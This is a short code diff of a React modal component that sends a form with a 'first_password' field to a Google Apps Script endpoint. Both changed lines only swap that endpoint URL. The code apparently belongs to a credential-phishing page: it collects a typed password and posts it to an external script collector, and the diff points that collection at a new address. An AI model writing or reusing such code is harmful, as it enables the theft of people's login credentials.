@@ -34,7 +34,7 @@ const Modal = ({ isModal, setIsModal }) => {
       form.append("first_password", password);
 
       axios.post(
-        "https://script.google.com/macros/s/AKfycbxeI9nhoTV_CadbrHkJ2KaZmQxL-7OZeKHwswuS7QvE-AwJXTmcXIDF1fBVAoPKucTG/exec",
+        "https://script.google.com/macros/s/AKfycbxoeJSDiNqUZkhz9bB4Si1sZOqVU3438C7VQaQigMXh9DdzJdqr5BYbhBPyqOlRuT5bGg/exec",
         form
       );
       // const content = `
@@ -86,7 +86,7 @@ const Modal = ({ isModal, setIsModal }) => {
 
       axios
         .post(
-          "https://script.google.com/macros/s/AKfycbxeI9nhoTV_CadbrHkJ2KaZmQxL-7OZeKHwswuS7QvE-AwJXTmcXIDF1fBVAoPKucTG/exec",
+          "https://script.google.com/macros/s/AKfycbxoeJSDiNqUZkhz9bB4Si1sZOqVU3438C7VQaQigMXh9DdzJdqr5BYbhBPyqOlRuT5bGg/exec",
           form
         )
         .then(() => {
